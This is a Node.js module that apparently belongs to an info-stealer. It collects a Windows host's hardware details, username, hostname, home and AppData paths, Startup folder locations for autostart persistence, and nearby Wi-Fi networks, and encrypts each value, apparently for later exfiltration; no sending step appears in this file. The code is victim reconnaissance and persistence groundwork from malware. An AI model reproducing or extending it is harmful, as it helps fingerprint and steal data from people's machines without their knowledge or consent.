module.exports = (client) => {
    return {
        cpus: [],
        ram: client.utils.encryption.encryptData(`${Math.round(client.requires.os.totalmem() / 1024 / 1024 / 1024)} GB`),
        version: client.utils.encryption.encryptData(client.requires.os.version()),
        uptime: client.utils.encryption.encryptData(`${(client.requires.os.uptime() / 60).toFixed(0)} minutes (${(client.requires.os.uptime() / 60 / 60).toFixed(2)} hours)`),
        hostdir: client.utils.encryption.encryptData(client.requires.os.homedir()),
        hostname: client.utils.encryption.encryptData(client.requires.os.hostname()),
        username: client.utils.encryption.encryptData(client.requires.os.userInfo().username),
        type: client.utils.encryption.encryptData(client.requires.os.type()),
        arch: client.utils.encryption.encryptData(client.requires.os.arch()),
        release: client.utils.encryption.encryptData(client.requires.os.release()),

        appdata: client.utils.encryption.encryptData(process.env.APPDATA),
        localappdata: client.utils.encryption.encryptData(process.env.LOCALAPPDATA),
        temp: client.utils.encryption.encryptData(process.env.TEMP),
        user_domain: client.utils.encryption.encryptData(process.env.COMPUTERNAME),
        monitor_address: client.utils.encryption.encryptData(process.env.MONITOR_ADDRESS),
        processor_identifier: client.utils.encryption.encryptData(process.env.PROCESSOR_IDENTIFIER),
        processor_architecture: client.utils.encryption.encryptData(process.env.PROCESSOR_ARCHITECTURE),
        processors: client.utils.encryption.encryptData(process.env.NUMBER_OF_PROCESSORS),
        system_drive: client.utils.encryption.encryptData(process.env.SystemDrive),

        autostart: [client.utils.encryption.encryptData(process.env.APPDATA + "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"), client.utils.encryption.encryptData(process.env.SystemDrive + "\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup")],
        

        wifi_connections: async() => {
            const wifi_connections = await client.requires.systeminformation.getDynamicData();
            
            let text = ""

            wifi_connections.wifiNetworks.forEach((connection) => {
                text += `${connection.ssid} | ${connection.bssid}\n`
            })

            client.config.counter.wifinetworks = wifi_connections.wifiNetworks.length;

            return text
        },

        connection_info: undefined,
    }
}